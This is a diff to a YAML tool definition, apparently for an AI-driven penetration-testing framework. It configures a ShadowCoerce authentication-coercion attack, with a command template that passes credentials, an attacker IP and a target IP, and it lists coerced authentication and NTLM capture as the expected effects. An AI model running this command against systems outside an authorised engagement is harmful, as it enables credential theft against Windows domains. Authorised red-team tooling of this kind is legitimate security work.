@@ -8,13 +8,14 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: python3 shadowcoerce.py -d {domain} -u '{username}' -p '{password}'
   {attacker_ip} {target_ip}
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- coerced_auth
+- ntlm_captured
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: '- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
-  - [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.'
+mechanism: "- [Unit 42 \u2013 Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)\
+  \ - [Microsoft \u2013 MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft."
 hacktricks_ref: windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
